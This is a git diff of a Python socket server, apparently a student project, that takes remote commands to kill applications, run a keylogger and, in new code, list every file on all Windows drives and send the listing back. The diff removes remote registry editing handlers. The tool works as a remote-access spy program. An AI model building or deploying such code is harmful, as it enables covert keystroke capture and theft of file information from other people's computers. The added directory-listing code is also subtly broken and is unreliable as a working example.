@@ -4,19 +4,13 @@ import threading
 import socket
 import os
 import pyautogui
-import registry
+import platform
 from winreg import *
 from time import sleep
 import subprocess
+import json
 import keyboard #pip install keyboard
 
-mp={
-    'HKEY_CLASSES_ROOT':HKEY_CLASSES_ROOT,
-    'HKEY_CURRENT_CONFIG':HKEY_CURRENT_CONFIG,
-    'HKEY_CURRENT_USER':HKEY_CURRENT_USER,
-    'HKEY_USERS':HKEY_USERS,
-    'HKEY_LOCAL_MACHINE':HKEY_LOCAL_MACHINE
-}
 class Server(object):
     def main_form(self):
         """Creates the interface window"""
@@ -28,11 +22,16 @@ class Server(object):
         self.mainframe.grid(column=0, row=0, sticky=(N,W,E,S))
         self.root.columnconfigure(0, weight=1)
         self.root.rowconfigure(0, weight=1)
-        self.root.resizable(FALSE, FALSE)
+        
+        self.root.geometry("640x360")
 
         #Open server button
         self.connectButton = ttk.Button(self.mainframe, text='Open', command=self.threadConnect)
         self.connectButton.grid(column=1, row=1)
+
+        self.mainframe.columnconfigure(1, weight=1)
+        self.mainframe.rowconfigure(1, weight=1)
+
         self.root.mainloop()
         pass
     def threadConnect(self):
@@ -102,39 +101,6 @@ class Server(object):
                 plusStr=str(arr[3*i].decode()+' '+arr[3*i+1].decode()+' '+arr[3*i+2].decode()+' ')
                 self.conn.send(plusStr.encode())
             self.conn.send('STOPRIGHTNOW'.encode())
-        elif Str.decode().find('GETVALUE')!=-1:
-            arr = Str.decode().split(' ')
-            brr = arr[1].split('\\',1)
-            self.conn.send(str(registry.getValue(mp[brr[0]],brr[1],arr[2])).encode())
-        elif Str.decode().find('DELETEVALUE')!=-1:
-            arr = Str.decode().split(' ')
-            brr = arr[1].split('\\',1)
-            if registry.deleteValue(mp[brr[0]],brr[1],arr[2]):
-                self.conn.send('Completed'.encode())
-            else:
-                self.conn.send('Failure'.encode())
-        elif Str.decode().find('CREATEKEY')!=-1:
-            arr = Str.decode().split(' ')
-            if registry.createKey(arr[1])==True:
-                self.conn.send('Completed'.encode())
-            else:
-                self.conn.send('Failure'.encode())
-        elif Str.decode().find('DELETEKEY')!=-1:
-            arr = Str.decode().split(' ')
-            if registry.deleteKey(arr[1])==True:
-                self.conn.send('Completed'.encode())
-            else:
-                self.conn.send('Failed'.encode())
-        elif Str.decode().find('SETVALUE')!=-1:
-            arr = Str.decode().split('%')
-            brr = arr[1].split('\\',1)
-            try:
-                if registry.setValue(mp[brr[0]],brr[1],arr[2],arr[3],arr[4]) == True:
-                    self.conn.send('Completed'.encode())
-                else:
-                    self.conn.send('Failed'.encode())
-            except:
-                self.conn.send('Failed'.encode())
         elif Str.decode().find('KILLAPP') != -1:
             name = str(Str.decode().split()[1])
             try:
@@ -163,12 +129,35 @@ class Server(object):
             bep.start()
         elif Str.decode() == 'KEYSTOP':
             self.stopKeylogging()
-        else:
-            f_bin=open('testing.reg','wb+')
-            f_bin.write(Str)
-            f_bin.close()
-            if len(Str)<1024:
-                registry.importRegistry(filepath=r'E:\Python\Socket_Midterm\testing.reg')
+
+        elif Str.decode() == 'DIRSHW':
+            if platform.system() == "Windows":
+                possible_names = [chr(i) + ":\\" for i in range(ord("A"), ord("Z") + 1)]
+                partitions = {}
+                for name in possible_names:
+                    if os.path.isdir(name):
+                        partitions[name] = self.list_files(name)
+                data = json.dumps(partitions)
+                self.conn.sendall(data)
+            else:
+                pass
+            
+
+
+
+            pass
+
+    def list_files(self, partition):
+        ret = []
+        for root, dirs, files in os.walk(partition):
+            level = root.replace(self.root, '').count(os.sep)
+            indent = '\t' * (level)
+            ret.append('{}{}/'.format(indent, os.path.basename(root)))
+            subindent = '\t' * (level + 1)
+            for f in files:
+                ret.append('{}{}'.format(subindent, f))
+        return ret
+
                 
 
     #ATTRIBUTES AND METHODS SPECIFICALLY FOR KEYLOGGING:
